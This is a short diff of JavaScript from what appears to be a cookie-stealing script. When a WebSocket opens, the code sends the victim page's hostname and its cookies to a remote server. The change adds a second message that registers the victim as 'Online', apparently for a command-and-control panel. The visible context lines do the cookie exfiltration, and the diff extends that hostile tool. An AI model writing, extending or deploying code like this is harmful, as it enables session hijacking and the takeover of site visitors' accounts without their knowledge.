@@ -37,6 +37,8 @@ ws.onopen = function(){
   var domSite = window.location.hostname;
   var jsonPackage = {id: id, website: domSite, type: 'cookie', cookie: cookies};
   ws.send(JSON.stringify(jsonPackage));
+  var jsonPackage = {id: id, type: 'Online'};
+  ws.send(JSON.stringify(jsonPackage));
 }
 
 /*
